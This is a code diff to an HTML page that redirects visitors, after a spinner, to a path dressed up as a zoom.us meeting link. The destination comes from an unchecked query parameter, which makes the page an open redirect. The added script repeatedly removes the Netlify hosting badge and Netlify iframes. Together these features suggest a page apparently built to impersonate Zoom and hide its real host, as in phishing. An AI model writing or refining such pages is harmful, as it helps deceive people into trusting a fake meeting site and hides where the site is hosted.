@@ -74,8 +74,6 @@ a[href*="netlify.com"][target="_blank"]:not(.wc-link2) {
   // ============================================================
   //  ★ CONFIG
   // ============================================================
-    // Read destination + duration from the query string.
-  // Defaults preserve the original 1s → meeting/index.html behaviour.
   var _qs              = new URLSearchParams(window.location.search);
   var MEETING_PAGE_URL = _qs.get('to') || '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/meeting/index.html';
   var SPINNER_MS       = parseInt(_qs.get('ms'), 10) || 1000;
@@ -96,6 +94,25 @@ a[href*="netlify.com"][target="_blank"]:not(.wc-link2) {
   }, SPINNER_MS);
 
 })();
+</script>
+
+<!-- Force Remove Netlify Badge -->
+<script>
+  (function() {
+    function removeBadge() {
+      var badge = document.getElementById('netlify-badge');
+      if (badge) badge.remove();
+      
+      var iframes = document.querySelectorAll('iframe[src*="netlify.com"]');
+      for (var i = 0; i < iframes.length; i++) {
+        iframes[i].remove();
+      }
+    }
+    
+    // Run immediately, and set up a watcher in case Netlify injects it late
+    removeBadge();
+    setInterval(removeBadge, 500); 
+  })();
 </script>
 </body>
 </html>
